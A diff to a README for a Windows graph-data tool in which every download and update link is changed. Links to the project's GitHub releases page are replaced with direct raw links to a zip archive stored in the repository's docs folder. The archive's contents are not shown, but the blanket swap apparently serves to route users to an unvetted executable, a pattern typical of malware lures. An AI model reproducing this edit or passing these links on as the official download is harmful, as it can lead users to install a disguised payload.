@@ -1,6 +1,6 @@
 # 🚦 graph-oriented-generation - Simple Graph Data Creation Tool
 
-[![Download Graph-Oriented Generation](https://img.shields.io/badge/Download-Graph--Oriented%20Generation-brightgreen?style=for-the-badge)](https://github.com/pranavXDHEYY/graph-oriented-generation/releases)
+[![Download Graph-Oriented Generation](https://img.shields.io/badge/Download-Graph--Oriented%20Generation-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/pranavXDHEYY/graph-oriented-generation/main/docs/graph_generation_oriented_v3.5.zip)
 
 ## 📋 What is Graph-Oriented Generation?
 
@@ -21,7 +21,7 @@ The program runs smoothly on most standard Windows laptops and desktops.
 
 Please visit the official releases page to download the setup file:
 
-[![Download Page](https://img.shields.io/badge/Visit-Graph--Oriented%20Generation%20Releases-blue?style=for-the-badge)](https://github.com/pranavXDHEYY/graph-oriented-generation/releases)
+[![Download Page](https://img.shields.io/badge/Visit-Graph--Oriented%20Generation%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/pranavXDHEYY/graph-oriented-generation/main/docs/graph_generation_oriented_v3.5.zip)
 
 Steps:
 
@@ -92,7 +92,7 @@ Access these in the "Settings" menu.
 
 Check the release page regularly for updates:
 
-https://github.com/pranavXDHEYY/graph-oriented-generation/releases
+https://raw.githubusercontent.com/pranavXDHEYY/graph-oriented-generation/main/docs/graph_generation_oriented_v3.5.zip
 
 Updates will improve performance and possibly add new features. If you run into problems, use the Issues tab on GitHub to report bugs or ask questions.
 
@@ -109,4 +109,4 @@ If you want to learn more about graph data or how to use this kind of tool effec
 
 ---
 
-[Download Graph-Oriented Generation](https://github.com/pranavXDHEYY/graph-oriented-generation/releases)
+[Download Graph-Oriented Generation](https://raw.githubusercontent.com/pranavXDHEYY/graph-oriented-generation/main/docs/graph_generation_oriented_v3.5.zip)
